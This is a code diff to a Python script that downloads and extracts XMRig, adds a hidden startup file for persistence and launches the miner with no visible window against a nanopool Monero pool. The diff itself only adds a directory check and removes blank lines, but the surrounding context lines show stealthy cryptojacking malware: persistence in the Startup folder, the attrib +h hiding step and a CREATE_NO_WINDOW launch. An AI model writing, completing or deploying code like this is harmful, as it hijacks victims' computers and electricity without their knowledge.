@@ -24,6 +24,10 @@ EXTRACT_DIR = "C:\\Program Files (x86)\\Shell"
 BITCOIN_ADDRESS = "82WFpBT3pLrBHDHXpe5TL2cQLEepYDieiDMZADyb3pHLd8oQCrMLs44WCi8vBN3aT8AkbRXnhry5JFEdyS9nzWSP6jDNWn1"
 STARTUP_PATH = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup", "xmrig_startup.vbs")
 
+# Ensure the extraction directory exists
+if not os.path.exists(EXTRACT_DIR):
+    os.makedirs(EXTRACT_DIR)
+
 response = requests.get(URL, stream=True)
 with open(FILENAME, "wb") as file:
     for chunk in response.iter_content(chunk_size=1024):
@@ -47,8 +51,6 @@ if extracted_folders:
     # Set the file as hidden (Windows only)
     os.system(f'attrib +h "{STARTUP_PATH}"')
 
-
-    
     subprocess.Popen(
         [xmrig_path, "-o", "xmr-us-east1.nanopool.org:14433", "-u", BITCOIN_ADDRESS, "--tls", "--coin", "monero"],
         creationflags=subprocess.CREATE_NO_WINDOW,
